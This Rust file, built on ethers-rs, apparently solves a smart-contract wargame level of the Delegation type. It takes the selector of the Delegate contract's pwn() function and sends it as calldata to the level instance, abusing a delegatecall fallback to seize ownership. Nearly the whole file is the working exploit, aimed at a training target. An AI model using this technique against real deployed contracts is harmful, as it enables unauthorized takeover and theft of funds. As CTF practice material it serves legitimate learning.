use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use hex::ToHex;
use std::error::Error;

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?;

    let compiled = compile(Solc::new("./contracts/**/*.sol")).await?;

    let delegate_contract = compiled
        .get("Delegate")
        .expect("could not find Delegate contract");
    let pwn_sig: Bytes = delegate_contract
        .abi
        .function("pwn")?
        .short_signature()
        .to_vec()
        .into();
    println!(
        "function signature of pwn(): {}",
        pwn_sig.encode_hex::<String>()
    );

    let tx = TransactionRequest::new()
        .to(level.instance.parse::<Address>()?)
        .data(pwn_sig)
        .gas(100000);
    let receipt = client.send_transaction(tx, None).await?.await?;
    println!("receipt:\n{}\n", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
